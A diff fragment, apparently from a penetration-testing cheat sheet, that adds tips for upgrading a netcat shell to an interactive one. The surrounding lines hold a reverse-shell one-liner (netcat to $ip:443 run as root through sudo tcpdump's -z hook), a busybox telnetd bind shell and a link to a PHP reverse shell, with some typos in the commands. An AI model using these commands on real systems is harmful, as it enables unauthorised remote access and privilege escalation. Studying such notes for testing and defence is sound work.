@@ -48,6 +48,12 @@
          echo $’id\\n/bin/netcat $ip 443 –e /bin/bash’ > /tmp/.test chmod +x /tmp/.test sudo tcpdump –ln –I eth- -w /dev/null –W 1 –G 1 –z /tmp/.tst –Z root
 
     From busybox `/bin/busybox telnetd -|/bin/sh -p9999`
+    
+*   If you've obtained a partially interactive bash shell (e.g. from a netcat listener) you can upgrade to a fully interactive shell (with tab autocomplete, and commands such as su and nano) by running the following commands:
+
+        CTRL+Z         #send current shell to background
+        stty raw -echo #tell your terminal to pass keyboard shortcuts etc.
+        fg             #bring shell back to the foreground
 
 *   Pen test monkey PHP reverse shell  
     [http://pentestmonkey.net/tools/web-shells/php-reverse-shel](http://web.archive.org/web/20171113221652/http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
